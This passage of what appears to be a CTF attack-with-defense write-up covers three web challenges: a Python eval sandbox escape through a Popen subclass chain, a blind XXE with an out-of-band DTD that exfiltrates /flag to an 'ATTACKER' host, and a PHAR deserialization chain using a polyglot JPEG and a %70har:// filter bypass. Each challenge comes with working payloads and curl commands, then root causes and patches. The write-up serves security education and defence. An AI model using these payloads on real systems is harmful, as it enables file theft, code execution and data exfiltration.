                        error("missing ')'")
                    state["pos"] += 1
                    if fn == "upper":
                        return inner_value.upper(), "str(" + inner_expr + ").upper()"
                    return inner_value.lower(), "str(" + inner_expr + ").lower()"
        error("unexpected token")

    def parse_expr():
        values_acc = []
        exprs_acc = []
        value, expr = parse_term()
        values_acc.append(value)
        exprs_acc.append(expr)
        skip_ws()
        while state["pos"] < n and s[state["pos"]] == "+":
            state["pos"] += 1
            value, expr = parse_term()
            values_acc.append(value)
            exprs_acc.append(expr)
            skip_ws()
        return "".join(values_acc), "+".join(exprs_acc)

    # Plain constant replacement (no placeholders, literals or functions):
    # preserve the historical behaviour of returning the text verbatim.
    if (
        "$" not in s
        and "'" not in s
        and '"' not in s
        and "upper(" not in s
        and "lower(" not in s
    ):
        return s, repr(s)

    value, expr = parse_expr()
    skip_ws()
    if state["pos"] != n:
        error("unexpected trailing characters in rule")
    return value, expr
```

`apply_rule` then calls the interpreter instead of `eval`:

```python
def apply_rule(pattern, replacement, filenames):
    reject = waf_reject_reason(replacement)
    if reject:
        raise ValueError(reject)
    regex = re.compile(pattern)
    results = []
    for name in filenames:
        match = regex.search(name)
        if not match:
            results.append({"source": name, "matched": False, "target": name})
            continue
        target, expr = render_legacy_replacement(replacement, match)
        results.append({"source": name, "matched": True, "target": str(target), "expr": expr[:200]})
    return results
```

Why this closes the hole: the interpreter only ever concatenates strings, uppercases them, or lowercases them. There is no path from user input to attribute access, subscripting, or a function call on any live object, so the subclass walk from section 4 has nothing to grab. The old `waf_reject_reason` blocklist stays in place as a second layer, but it is no longer what stands between the attacker and code execution.

##### 6.4 Verification

Legitimate inputs produce output identical to the original (including the `expr` field), and every exploit vector is rejected:

| Input | Before | After (patched) |
|---|---|---|
| `upper($1)+'-'+$2+'-'+$3+'.'+$4` | `HK-2026-invoice.csv` | `HK-2026-invoice.csv` ✅ |
| `lower($1)+'_'+${date}` | `hk_20260801` | `hk_20260801` ✅ |
| `$1` | `abc` | `abc` ✅ |
| `$1.__class__` | `<class 'str'>` | `invalid replacement rule` ✅ blocked |
| `len($1)` | `3` | `invalid replacement rule: unexpected token` ✅ blocked |
| Popen subclass chain | RCE | `invalid replacement rule` ✅ blocked |

##### 6.5 Patch package

`patch.tar.gz` containing, at the archive root:

`update.sh`:

```sh
#!/bin/sh
# Replace vulnerable eval-based evaluator with a safe interpreter.
cp app.py /app/app.py
chmod 644 /app/app.py
```

`app.py` is the fixed source (see repo). `update.sh` uses only the whitelisted commands `cp` and `chmod`.


#### Timeline

1. `/api/info` advertises "legacy expression replacement mode", and the `expr` field proves the replacement is `eval`'d.
2. Attribute access works, only `{str, len}` builtins exist, and a naive substring blocklist guards `eval`.
3. Escape: `type.__dict__['__subcla'+'sses__'](object)` gives the subclass list, which contains `subprocess.Popen` at index 350.
4. Call `Popen(['cat','/fl'+'ag'],-1,None,None,-1).communicate()[0]` (positional `stdout`, split `flag`) to read the flag.
5. Patch: delete `eval`, implement a safe recursive-descent interpreter for the documented grammar, and ship it via `update.sh` (`cp`/`chmod`).

#### Takeaways

- Never `eval()` user input. A blocklist plus a restricted `__builtins__` is not a sandbox, because live Python objects leak the entire class graph through attribute access.
- Substring WAFs fall to concatenation and `__dict__` subscripting, as in `'__subcla'+'sses__'`.
- For expression features, parse a narrow, explicit grammar and evaluate it yourself. Do not hand the input to the language runtime.

---

### Blind Invoice XML

| | |
|---|---|
| **Difficulty** | Hard |
| **Points** | 5 |
| **Flag** | `flag{5d33dbc0-f424-4500-83be-18a8d0d229d7}` |

#### Overview

An "enterprise invoice exchange gateway" (`InvoiceLink Gateway`) takes a single
invoice XML document, pre-validates it, and returns only an import status plus a
short field summary (invoice no, supplier, tax ID, issue date, amount, remark).

> The gateway returns only processing status and a field summary; parser details
> and partner compatibility policy are published in the API profile. Detailed
> errors are written to backend audit logs; the console only displays results.

That paragraph sets up a blind XXE. The XML content is never echoed back, and
errors go to a log we cannot read. We have to do two things:

- Attack: pull `/flag` out through a blind, output-normalized parser.
- Defend: ship a patch (`update.sh` plus fixed sources) that closes the XXE
  without breaking the service.

The landing page points at two endpoints:

```html
<!-- Partner compatibility profile and parser metadata are exposed by /api/info. -->
```


#### Recon

##### 2.1 `/api/info`

```text
{
  "accepted_root": "Invoice",
  "compatibility_profile": "hkric-partner-legacy",
  "endpoints": {"import": "/upload", "profile": "/api/info"},
  "parser_profile": "invoice-normalizer-v2",
  "partner_channel": "HKRIC-B2B-XML",
  "partner_headers": ["X-Partner-Channel", "X-Partner-Profile"],
  "profile_transport": "partner-channel headers",
  "required_fields": ["InvoiceNo", "Supplier", "TaxId", "IssueDate", "Amount"],
  "optional_fields": ["Remark"],
  "sample": "<Invoice><InvoiceNo>INV-2026-001</InvoiceNo>...</Invoice>"
}
```

Two things stand out:

- The import endpoint is `POST /upload`.
- There is a legacy compatibility profile `hkric-partner-legacy`, selected with
  two request headers: `X-Partner-Channel` and `X-Partner-Profile`.

##### 2.2 Baseline import

The form posts `multipart/form-data` with an `xml` field. Watch out: with
`curl -F`, a leading `<` is read as a file reference, so send the XML from a file
(`-F 'xml=<b.xml'`).

```bash
curl -sk -X POST "https://eci-2zee1cvig94bwcb1mt5a.cloudeci1.ichunqiu.com:5000/upload" -F 'xml=<b.xml;type=text/xml'
```

```text
{"success":true,"summary":{"amount":"1280.00","invoice_no":"INV-2026-001",
"issue_date":"2026-07-01","remark":"x","supplier":"HKRIC","tax_id":"91440300MA5EXAMPLE"}}
```

The fields come back verbatim in `summary`, which gives us a reflection surface to
abuse.


#### Finding the XXE

##### 3.1 The default profile blocks DTDs

A standard in-band XXE into `Supplier`:

```xml
<?xml version="1.0"?>
<!DOCTYPE Invoice [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<Invoice><Supplier>&xxe;</Supplier>...</Invoice>
```

Returns `{"message":"导入失败","success":false}`. Even a purely internal entity
fails, so the default parser rejects any DOCTYPE.

##### 3.2 The legacy profile unlocks entities

Adding the two partner headers changes the behavior:

```
X-Partner-Channel: HKRIC-B2B-XML
X-Partner-Profile: hkric-partner-legacy
```

An internal general entity now expands and reflects:

```xml
<!DOCTYPE Invoice [<!ENTITY xxe "REPLACED">]>
... <Supplier>&xxe;</Supplier> ...
```

gives `"supplier":"REPLACED"`, so in-band XXE works.

An external `SYSTEM file://` entity resolves too, but the summary comes back with
fixed placeholder values:

```text
{"success":true,"summary":{"invoice_no":"legacy-normalized",
 "supplier":"legacy-normalized","tax_id":"legacy-normalized",
 "remark":"backend-audit-only", ...}}
```

This is the blind part of the challenge. The moment an external file is touched,
the app swaps the sensitive fields for placeholders.

##### 3.3 A boolean oracle drops out of it

Even blinded, success versus failure leaks information. The request only succeeds
if the external entity resolved and the document stayed well-formed:

| Entity target                | Result   | Meaning                         |
|------------------------------|----------|---------------------------------|
| `file:///etc/passwd`         | success  | exists, readable, parseable     |
| `file:///flag`               | success  | flag file exists and readable   |
| `file:///app/app.py`         | success  | source exists                   |
| `file:///nonexistent-xyz`    | fail     | missing                         |
| `file:///etc/shadow`         | fail     | permission denied               |
| `file:///app`                | fail     | directory                       |
| `http://127.0.0.1:80/`       | fail     | connection refused              |

So `/flag` is present and readable, but blinded. We need out-of-band
exfiltration.


#### Exploitation: OOB XXE

##### 4.1 Confirm egress

The container has outbound internet access (confirmed below), so we host an
attacker server and use `cloudflared` for a public HTTPS URL:

```bash
python3 srv.py &                                   # logging listener :8000
cloudflared tunnel --url http://localhost:8000     # -> https://<rand>.trycloudflare.com
```

Egress test: a DOCTYPE-referenced external DTD and an `http://` general entity
both call back to our server:

```
HIT /dtdtest
HIT /genent
```

Egress works.

##### 4.2 Parameter-entity exfiltration DTD

External general entities get blinded, and file content may contain
XML-breaking characters, so we use the standard external-DTD plus parameter-entity
OOB pattern. Hosted `e.dtd`:

```dtd
<!ENTITY % file SYSTEM "file:///flag">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://ATTACKER/x?d=%file;'>">
%eval;
%exfil;
```

Payload posted to `/upload` with the legacy headers:

```xml
<?xml version="1.0"?>
<!DOCTYPE Invoice SYSTEM "https://ATTACKER/e.dtd">
<Invoice><InvoiceNo>A</InvoiceNo><Supplier>x</Supplier><TaxId>C</TaxId>
<IssueDate>2026-07-01</IssueDate><Amount>1</Amount><Remark>x</Remark></Invoice>
```

Server log:

```
HIT /e.dtd
HIT /x?d=ZmxhZ3s1ZDMzZGJjMC1mNDI0LTQ1MDAtODNiZS0xOGE4ZDBkMjI5ZDd9
```

##### 4.3 Decode

```bash
$ echo ZmxhZ3s1ZDMzZGJjMC1mNDI0LTQ1MDAtODNiZS0xOGE4ZDBkMjI5ZDd9 | base64 -d
flag{5d33dbc0-f424-4500-83be-18a8d0d229d7}
```

Why is it already base64? The server's own resolver base64-encodes every file it
reads (see section 5). That works in our favor: it makes multi-line and binary
content transport-safe, so the same technique cleanly dumps `/app/app.py` too.


#### Root cause (from leaked `/app/app.py`)

Running the same OOB technique against `file:///app/app.py` recovered the full
source. The bug is a deliberately dangerous legacy parser:

```python
class LegacyHTTPResolver(etree.Resolver):
    def resolve(self, system_url, public_id, context):
        lowered = system_url.lower()
        if lowered.startswith("file://"):
            path = unquote(urlparse(system_url).path)
            with open(path, "rb") as f:
                encoded = base64.urlsafe_b64encode(f.read()).decode().rstrip("=")
            self.sensitive_external_reads += 1
            return self.resolve_text(encoded, context, "xxe_file_")   # <-- arbitrary file read
        ...
        response = requests.get(system_url, timeout=3)                # <-- SSRF
        ...

def build_legacy_parser():
    resolver = LegacyHTTPResolver()
    parser = etree.XMLParser(
        load_dtd=True,          # external DTDs loaded
        resolve_entities=True,  # entities expanded
        no_network=False,       # network fetches allowed
        recover=False,
    )
    parser.resolvers.add(resolver)
    return parser, resolver
```

The default parser is safe:

```python
etree.XMLParser(load_dtd=False, resolve_entities=False, no_network=True, recover=False)
```

`build_public_summary()` is what blinds the output. When
`sensitive_external_reads > 0`, it overwrites the sensitive fields with
`legacy-normalized` and `backend-audit-only`. That hides the data in the response
but does nothing to stop the file read or the OOB callback.

Also present: `POST /__checker/secret-proof`, the grader's HMAC oracle over
`load_flag()`. The defense has to keep it and `/__checker/health` working.


#### Defense

This is an attack-with-defense round, so after grabbing the flag we also have to
patch the service. The constraints:

- Submit `update.sh` plus the fixed source files, packaged as a `.gz`.
- `update.sh` may only use `mv`, `cp`, and `chmod`. No `sed`, no `python`, no
  in-place editing.
- After `update.sh` runs, the environment restarts the service automatically.
- The grader keeps probing `/upload`, `/api/info`, and `/__checker/*`, so the
  patch must fix the bug without breaking normal imports or the flag oracle.

Because the script can only move, copy, or chmod, we cannot edit the file on the
box. Instead we ship a complete replacement `app.py` inside the archive and copy
it over the original.

##### 6.1 What has to be closed

The whole vulnerability lives in the legacy parser path. Three capabilities have
to go:

1. `file://` reads inside `LegacyHTTPResolver.resolve` (arbitrary file read).
2. `http(s)://` fetches in the same method (SSRF, and the OOB exfil channel).
3. External DTD loading and entity expansion on the legacy `XMLParser`
   (`load_dtd=True`, `resolve_entities=True`, `no_network=False`), which is what
   lets the DTD and entities fire in the first place.

The response-side blinding in `build_public_summary()` is not a fix and we do not
rely on it. It hides the data in the summary but leaves the file read, the SSRF,
and the boolean oracle intact.

##### 6.2 Source fixes (`app/app.py`)

1. Neutralize the resolver so it never reads files and never fetches URLs. The
   whole file/http body is replaced:

   ```python
   def resolve(self, system_url, public_id, context):
       # Hardened: never resolve external references
       # (no file:// reads, no http(s):// fetches). Any external entity is refused.
       return None
   ```

2. Harden the legacy parser so it matches the safe default: no DTD, no entity
   expansion, no network, and no custom resolver attached:

   ```python
   def build_legacy_parser():
       # Hardened: legacy compatibility profile no longer loads external DTDs or
       # resolves entities, and never touches the network.
       resolver = LegacyHTTPResolver()
       parser = etree.XMLParser(
           load_dtd=False,
           resolve_entities=False,
           no_network=True,
           recover=False,
       )
       return parser, resolver
   ```

3. Reject any DOCTYPE in the legacy path, the same check the default profile
   already does. With entity resolution off, a DOCTYPE can only be an XXE
   attempt, so we fail closed:

   ```python
   parser, resolver = build_legacy_parser()
   root = etree.fromstring(xml_text.encode("utf-8"), parser)
   if root.getroottree().docinfo.doctype:
       raise ValueError("DTD imports are not allowed")
   return extract_invoice_fields(root), False
   ```

`touched_external_file` is now always `False`, so `build_public_summary()` just
returns the real fields. That is fine: a legitimate invoice has no external
entities, so nothing legitimate ever needed the placeholder path.

Everything else stays as-is. The routes, the field extraction, the
`valid_invoice_fields` rules, and the `/__checker/secret-proof` HMAC oracle are
untouched, so normal imports and the grader's checks keep working.

##### 6.3 `update.sh`

```sh
#!/bin/sh
cp app/app.py /app/app.py
chmod 644 /app/app.py
```

##### 6.4 Package layout

```
patch.tar.gz
├── update.sh        # cp + chmod only
└── app/
    └── app.py       # hardened source
```

Built with:

```bash
tar -czf patch.tar.gz update.sh app/app.py
```

##### 6.5 Verification

Checked locally against the same lxml parser settings before submitting:

```text
normal invoice  -> parses, summary returns real fields
XXE payload     -> entity NOT expanded (Supplier empty) AND DOCTYPE present
                   -> ValueError -> {"success": false}
```

The default profile was already safe and is left alone. Both the file-read and
the SSRF/OOB paths are gone, and the boolean oracle disappears with them because
a DOCTYPE now fails before any resolution happens.


#### Timeline

1. `/api/info` leaks the legacy profile and its two selector headers.
2. The default profile blocks DTDs; the legacy profile (headers) enables entity
   resolution.
3. Internal entities reflect; external file entities are blinded but leave a
   boolean oracle, and confirm `/flag`.
4. The container has egress, so OOB XXE works via an external DTD plus parameter
   entities.
5. The resolver base64-encodes file reads, giving clean exfil of `/flag` (and
   `/app/app.py`).
6. Flag: `flag{5d33dbc0-f424-4500-83be-18a8d0d229d7}`.
7. Patch: kill the resolver, harden the legacy `XMLParser`, reject DOCTYPEs.

#### Appendix — Automated exploit

`exploit.py` runs the whole chain: listener plus cloudflared tunnel, DTD hosting,
payload delivery, and base64 decode.

```bash
python3 exploit.py -u https://eci-2zee1cvig94bwcb1mt5a.cloudeci1.ichunqiu.com:5000                 # dump /flag
python3 exploit.py -u https://eci-2zee1cvig94bwcb1mt5a.cloudeci1.ichunqiu.com:5000 -f file:///app/app.py   # dump source
```

#### Appendix — Key payloads

Attacker DTD (`e.dtd`):

```dtd
<!ENTITY % file SYSTEM "file:///flag">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://ATTACKER/x?d=%file;'>">
%eval;
%exfil;
```

Upload payload (headers `X-Partner-Channel: HKRIC-B2B-XML`,
`X-Partner-Profile: hkric-partner-legacy`):

```xml
<?xml version="1.0"?>
<!DOCTYPE Invoice SYSTEM "https://ATTACKER/e.dtd">
<Invoice><InvoiceNo>A</InvoiceNo><Supplier>x</Supplier><TaxId>C</TaxId>
<IssueDate>2026-07-01</IssueDate><Amount>1</Amount><Remark>x</Remark></Invoice>
```

---

### Phar Gallery

| | |
|---|---|
| **Value** | 5 (attack) + 5 (defense) per round |
| **Target** | `https://eci-2ze3oet7h253uo9buvgp.cloudeci1.ichunqiu.com:5000` |
| **Flag** | `flag{0c8e9f26-e5e0-4f84-a45f-07c22d7cbeac}` |


#### Overview

"Phar Gallery" is a compliance attachment-preview service written in PHP 8. Staff
upload contract scans, expense vouchers, and PDFs by case number, generate preview
jobs, check attachment reference status, and read approval results.

The application exposes these routes (`index.php`):

| Route | Method | Purpose |
|-------|--------|---------|
| `/` | GET | HTML single-page UI |
| `/api/info` | GET | Endpoint metadata |
| `/upload` | POST | Upload attachment (jpg/jpeg/png/pdf) |
| `/preview` | POST | Build a preview job from an attachment id |
| `/check` | POST | Attachment reference existence check |
| `/claim` | GET | Read approval result; returns flag when approved |
| `/__checker/*` | POST | Platform checker hooks (need `CHECKER_TOKEN`) |

The bug is a PHAR deserialization (PHP object injection) reachable from `/check`. It
chains a filter bypass with a POP gadget to get an arbitrary file write, which forges
the approval "proof" file and unlocks the flag through `/claim`.


#### The win condition

`/claim` returns the flag only when a proof file on disk matches an expected value:

```php
const PROOF_FILE = '/tmp/web4_phar_gallery_proof';
const APPROVED_PREFIX = 'approved-phar-gallery-ticket';

function expected_proof(string $caseId): string {
    return APPROVED_PREFIX . ':' . $caseId;          // approved-phar-gallery-ticket:<caseId>
}
function proof_ok(string $caseId): bool {
    return is_file(PROOF_FILE)
        && trim((string)file_get_contents(PROOF_FILE)) === expected_proof($caseId);
}

if ($path === '/claim') {
    $caseId = (string)($_GET['case'] ?? '');
    if (!valid_case($caseId)) { /* 400 */ }
    $approved = proof_ok($caseId);
    $status = ApprovalTicket::status($caseId, $approved);
    if ($approved) {
        json_response(['success' => true, 'status' => $status, 'flag' => flag_value()]);
    } else {
        json_response(['success' => false, 'status' => $status], 403);
    }
}
```

So the objective reduces to one thing: write the file `/tmp/web4_phar_gallery_proof`
with the exact contents `approved-phar-gallery-ticket:<caseId>` for a `caseId` we
control (`caseId` matches `^[a-zA-Z0-9_-]{3,32}$`).

Nothing in the normal business flow writes that file. Only a destructor gadget does.


#### The write primitive: `StorageWriter::__destruct`

`lib/StorageWriter.php`:

```php
class StorageWriter
{
    public $target = '';
    public $value  = '';

    public function writeCache(string $key, string $value): void { /* normal preview cache */ }

    public function __destruct()
    {
        if ($this->target === 'approval-proof' && is_string($this->value)) {
            file_put_contents(PROOF_FILE, $this->value, LOCK_EX);
        }
    }
}
```

A `StorageWriter` object whose `target === 'approval-proof'` writes `value` straight
into `PROOF_FILE` when it is destroyed. If we can get PHP to unserialize an object of
this class with those properties, the destructor forges the proof for us. There is no
need for a multi-hop POP chain here: the destructor is the whole gadget.

The codebase also ships longer gadget paths, which work as alternate solutions.
`ApprovalTicket::__destruct` calls `AuditTrail::__get('approval')`, which invokes
`PreviewRenderer::__toString`, which sets `StorageWriter->value` and then fires
`StorageWriter::__destruct`. All of them land the same write; the direct one is the
simplest.

What we still need is an unserialization sink for attacker-controlled data.


#### The sink: PHAR deserialization in `/check`

`index.php` `/check`:

```php
$exists = $store->legacyReferenceExists($file);
```

`lib/AttachmentStore.php`:

```php
public function legacyReferenceExists(string $reference): bool
{
    $this->guard->assertAllowed($reference);                       // (A) blocklist
    $workerReference = $this->guard->decodeForWorker($reference);  // (B) rawurldecode
    if (preg_match('/^[a-f0-9]{12}\.(jpg|jpeg|png|pdf)$/i', $workerReference)) {
        $workerReference = $this->uploadDir . '/' . $workerReference;
    }
    $this->guard->assertWorkerReferenceAllowed($workerReference, $this->uploadDir); // (C)
    ...
    return @file_exists($workerReference);                          // (D) SINK
}
```

`@file_exists()` on a `phar://` URL makes PHP open the Phar archive and unserialize
its metadata, invoking `__wakeup`/`__destruct` on whatever objects it contains. This
is the standard Phar deserialization trigger. We just need `$workerReference` to be a
`phar://` URL pointing at a file we uploaded.

Two guards stand in the way, and both are bypassable.

##### 4.1 The string blocklist (A) and the decode gap (B)

`lib/ReferenceGuard.php`:

```php
private $blockedTokens = ['phar://', 'php://', 'data://', '../', '..\\', '/flag'];

public function assertAllowed(string $reference): void {
    $lower = strtolower($reference);
    foreach ($this->blockedTokens as $token) {
        if (strpos($lower, $token) !== false) {
            throw new RuntimeException('reference denied by attachment guard');
        }
    }
}
public function decodeForWorker(string $reference): string {
    return rawurldecode($reference);                 // <-- decode happens AFTER the check
}
```

The blocklist is checked against the raw reference, but the value that actually
reaches the sink is `rawurldecode($reference)`. So URL-encode one character of the
scheme. `%70har://…` contains neither `phar://` nor `php://`, sails past
`assertAllowed`, and then `decodeForWorker` turns it back into `phar://…`. This is a
classic time-of-check/time-of-use gap.

##### 4.2 The worker-reference allowlist (C)

```php
public function assertWorkerReferenceAllowed(string $reference, string $uploadDir): void {
    if ($this->isUploadedFileReference($reference, $uploadDir)) return;
    if ($this->isUploadedPharReference($reference, $uploadDir)) return;   // <-- explicitly allows phar://
    throw new RuntimeException('reference outside attachment workspace');
}

private function isUploadedPharReference(string $reference, string $uploadDir): bool {
    if (!preg_match('#^phar://(.+\.(?:jpg|jpeg|png|pdf))/([A-Za-z0-9_.-]+)$#i', $reference, $m)) {
        return false;
    }
    return $this->pathInsideUploadDir($m[1], $uploadDir);   // realpath must be inside /tmp/web4_uploads
}
```

The allowlist explicitly permits `phar://<path-ending-in-jpg/png/pdf>/<entry>` as
long as the inner path resolves inside the upload directory `/tmp/web4_uploads`. That
is exactly what our uploaded attachment is. So a reference like

```
phar:///tmp/web4_uploads/<id>.jpg/a.txt
```

is accepted, and `@file_exists()` parses it as a Phar, then unserializes its metadata.

##### 4.3 Avoiding premature form-decoding

`request_data()` parses the body as JSON first and falls back to `$_POST`:

```php
function request_data(): array {
    $json = json_decode(file_get_contents('php://input') ?: '', true);
    if (is_array($json)) return $json;
    return $_POST;
}
```

If we sent `%70har://…` as `application/x-www-form-urlencoded`, PHP would URL-decode
it during form parsing, and `assertAllowed` would then see the literal `phar://` and
reject it. A JSON body keeps the `%70` intact until `decodeForWorker` runs the single,
controlled `rawurldecode`. That is what lines up the check/use gap.


#### Weaponizing the upload: a polyglot JPEG/PHAR

`AttachmentStore::saveUploaded` enforces two things:

- extension in `{jpg, jpeg, png, pdf}`
- a magic-byte header check on the first 16 bytes (a jpg must start with `\xFF\xD8\xFF`)

A Phar's stub is arbitrary bytes up to `__HALT_COMPILER();`, so we prepend the JPEG
magic to the stub. The file is a valid "JPEG" (it passes the sniff) and a valid Phar
(PHP parses its manifest and metadata) at the same time. Build it with a PHP CLI that
has `phar.readonly=0`:

```php
<?php
class StorageWriter {
    public $target = 'approval-proof';
    public $value  = 'approved-phar-gallery-ticket:casetest123';
}
@unlink('exploit.phar');
$p = new Phar('exploit.phar');
$p->startBuffering();
$p->setStub("\xFF\xD8\xFF\xE0" . "<?php __HALT_COMPILER(); ?>");  // JPEG magic + valid stub
$p->addFromString('a.txt', 'x');
$p->setMetadata(new StorageWriter());                            // <-- the gadget object
$p->stopBuffering();
```

```bash
php -d phar.readonly=0 build_phar.php
cp exploit.phar exploit.jpg          # serve it with a .jpg name
xxd exploit.jpg | head -1            # ffd8ffe0 3c3f 7068 70 ...  → passes the jpg header check
```

The metadata is the serialized `StorageWriter{target:'approval-proof', value:'approved-phar-gallery-ticket:casetest123'}`.
The `value` matches the proof string for the `caseId` we will claim (`casetest123`).


#### Full exploit

```bash
URL="https://eci-2ze3oet7h253uo9buvgp.cloudeci1.ichunqiu.com:5000"

# 1) Upload the polyglot phar as a jpg
curl -sk -X POST "$URL/upload" \
  -F "case=casetest123" \
  -F "file=@exploit.jpg;filename=exploit.jpg;type=image/jpeg"
# -> {"success":true,"attachment":{"id":"769950a4cc6c.jpg", ... }}

# 2) Trigger phar deserialization via /check.
#    - JSON body so PHP does NOT pre-decode the %70
#    - %70har:// dodges the raw blocklist, decodes to phar://
REF='%70har:///tmp/web4_uploads/769950a4cc6c.jpg/a.txt'
curl -sk -X POST "$URL/check" -H 'Content-Type: application/json' \
     -d "{\"file\":\"$REF\"}"
# -> {"success":true,"exists":true,"checked":"%70har:///tmp/web4_uploads/769950a4cc6c.jpg/a.txt"}
#    Side effect: StorageWriter::__destruct wrote the proof file.

# 3) Claim the (now-approved) case → flag
curl -sk "$URL/claim?case=casetest123"
```

Result:

```text
{"success":true,
 "status":{"case":"casetest123","approved":true,"message":"附件審批 proof 已確認"},
 "flag":"flag{0c8e9f26-e5e0-4f84-a45f-07c22d7cbeac}"}
```

##### Attack chain, end to end

```
upload polyglot jpg/phar  (magic-byte sniff bypassed)
        │
/check  { "file": "%70har:///tmp/web4_uploads/<id>.jpg/a.txt" }   (JSON body)
        │  assertAllowed(raw)          → sees "%70har://", not blocked   [TOCTOU gap]
        │  decodeForWorker(rawurldecode) → "phar:///tmp/web4_uploads/<id>.jpg/a.txt"
        │  assertWorkerReferenceAllowed  → isUploadedPharReference() ALLOWS phar://
        │  @file_exists("phar://…")       → parse Phar → unserialize metadata
        │        └── StorageWriter{target:'approval-proof', value:'approved-phar-gallery-ticket:casetest123'}
        │              └── __destruct → file_put_contents('/tmp/web4_phar_gallery_proof', value)
        ▼
/claim?case=casetest123   → proof_ok() true → FLAG
```


#### Root cause

1. Order-of-operations bug (TOCTOU): the blocklist is applied to the raw string, but
   the value is `rawurldecode`d afterwards, so encoded schemes bypass the filter.
2. The `phar://` wrapper is explicitly allowlisted (`isUploadedPharReference`), which
   hands attacker-controlled data to a filesystem function that triggers Phar
   unserialization.
3. Dangerous magic methods on serializable classes. `StorageWriter::__destruct`
   performs an arbitrary file write purely from object state, a ready-made POP gadget.
4. The content sniff is bypassable. A leading `\xFF\xD8\xFF` stub lets a Phar pass the
   "is it a jpg" header check, so the file is a phar/jpg polyglot.


#### Defense

Constraints: project at `/app/`; `update.sh` may only use `mv`, `cp`, `chmod`; the
whole business workflow must keep working (upload/preview/check/claim/api/errors); no
flag hardcoding, no blanket disabling of endpoints.

The normal `/check` business only needs to test plain uploaded files by id. It never
needs stream wrappers. So fix `ReferenceGuard` with two independent mitigations, either
one of which kills the exploit on its own:

1. Close the TOCTOU gap. Check both the raw and the decoded form in `assertAllowed`.
2. Remove the `phar://` allowance. `assertWorkerReferenceAllowed` accepts only plain
   uploaded-file references, and anything containing `://` is rejected.

##### 8.1 The full patched file

Only `lib/ReferenceGuard.php` changes. Here it is in full:

```php
<?php
declare(strict_types=1);

class ReferenceGuard
{
    private $blockedTokens = ['phar://', 'php://', 'data://', '../', '..\\', '/flag'];

    public function assertAllowed(string $reference): void
    {
        // Check both the raw reference and its decoded form so encoded
        // wrappers (e.g. %70har://) cannot slip past the blocklist.
        $candidates = [$reference, rawurldecode($reference)];
        foreach ($candidates as $candidate) {
            $lower = strtolower($candidate);
            foreach ($this->blockedTokens as $token) {
                if (strpos($lower, $token) !== false) {
                    throw new RuntimeException('reference denied by attachment guard');
                }
            }
        }
    }

    public function decodeForWorker(string $reference): string
    {
        return rawurldecode($reference);
    }

    public function assertWorkerReferenceAllowed(string $reference, string $uploadDir): void
    {
        // Only plain uploaded-file references are permitted. Stream wrappers
        // such as phar:// are rejected to prevent object injection when the
        // reference is later handed to filesystem functions.
        if ($this->isUploadedFileReference($reference, $uploadDir)) {
            return;
        }
        throw new RuntimeException('reference outside attachment workspace');
    }

    private function isUploadedFileReference(string $reference, string $uploadDir): bool
    {
        if (strpos($reference, '://') !== false || strpos($reference, "\0") !== false) {
            return false;
        }
        return $this->pathInsideUploadDir($reference, $uploadDir);
    }

    private function pathInsideUploadDir(string $path, string $uploadDir): bool
    {
        $base = realpath($uploadDir);
        $real = realpath($path);
        if ($base === false || $real === false) {
            return false;
        }
        $prefix = rtrim($base, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR;
        return strncmp($real, $prefix, strlen($prefix)) === 0;
    }
}
```

`isUploadedPharReference` is deleted, and `assertWorkerReferenceAllowed` no longer
calls it. `isUploadedFileReference` already rejects any reference containing `://` or
a null byte, so `phar://` can never reach `file_exists`, and no untrusted `unserialize`
remains (`request_data` produces arrays, not objects). Normal checks by attachment id
still resolve to `/tmp/web4_uploads/<id>` and work unchanged.

##### 8.2 Why the business still works

Every route the checker exercises is left intact:

- `/upload` still accepts jpg/jpeg/png/pdf by extension and by magic-byte header.
- `/preview` still resolves attachment ids and case ids through `findById`.
- `/check` still answers existence for a normal attachment id, because that id
  resolves to a plain path inside the upload directory and passes
  `isUploadedFileReference`.
- `/claim` still returns approval state from the real proof file.
- `/api/info` and the error paths are untouched.

Nothing is hardcoded, no endpoint is disabled, and no fixed success is returned. The
only capability removed is the `phar://` stream wrapper, which the business never used.

##### 8.3 Verifying the patch before submitting

Lint the file and run the guard logic in isolation against a normal id and both phar
variants:

```bash
php -l lib/ReferenceGuard.php   # No syntax errors detected

mkdir -p /tmp/web4_uploads
printf '\xff\xd8\xffx' > /tmp/web4_uploads/769950a4cc6c.jpg
php -r '
require "lib/ReferenceGuard.php";
$g = new ReferenceGuard(); $dir = "/tmp/web4_uploads";
function t($g,$dir,$ref){
  try {
    $g->assertAllowed($ref);
    $w = $g->decodeForWorker($ref);
    if (preg_match("/^[a-f0-9]{12}\.(jpg|jpeg|png|pdf)$/i",$w)) $w = "$dir/$w";
    $g->assertWorkerReferenceAllowed($w,$dir);
    return "ALLOW -> $w";
  } catch (Throwable $e) { return "DENY: ".$e->getMessage(); }
}
echo "normal id:    ", t($g,$dir,"769950a4cc6c.jpg"), "\n";
echo "phar plain:   ", t($g,$dir,"phar:///tmp/web4_uploads/769950a4cc6c.jpg/a"), "\n";
echo "phar encoded: ", t($g,$dir,"%70har:///tmp/web4_uploads/769950a4cc6c.jpg/a"), "\n";
'
```

Expected output:

```
normal id:    ALLOW -> /tmp/web4_uploads/769950a4cc6c.jpg
phar plain:   DENY: reference denied by attachment guard
phar encoded: DENY: reference denied by attachment guard
```

The exploit from section 6, re-run against the patched service, now fails at `/check`
with `reference denied by attachment guard`, and `/claim` stays at 403.

##### 8.4 Packaging the patch

The platform only permits `mv`, `cp`, and `chmod` inside `update.sh`, so the fixed
file travels in the archive and `update.sh` copies it into place.

`update.sh`:

```sh
#!/bin/sh
cp ReferenceGuard.php /app/lib/ReferenceGuard.php
chmod 644 /app/lib/ReferenceGuard.php
```

Build the archive:

```bash
tar -czf patch.tar.gz update.sh ReferenceGuard.php
```

Upload `patch.tar.gz` as the defense package. After `update.sh` runs, the platform
restarts the service and the defense point is scored on every following round.


#### Takeaways

- Never validate a string and then transform it (decode or normalize) before use.
  Validate the final value, or re-validate after every transform.
- Treat any user-influenced path passed to a filesystem function as an unserialization
  sink in PHP. `phar://` reaches `file_exists`, `is_file`, `getimagesize`,
  `file_get_contents`, and dozens more. Never allowlist the `phar://` scheme.
- Content-type "magic byte" checks do not prevent polyglots. A valid header does not
  mean the file isn't also a Phar.
- Destructors, `__toString`, and `__wakeup` that touch the filesystem based on object
  state are POP gadgets. The fewer of them you have, the smaller the attack surface
  once a sink exists.

---

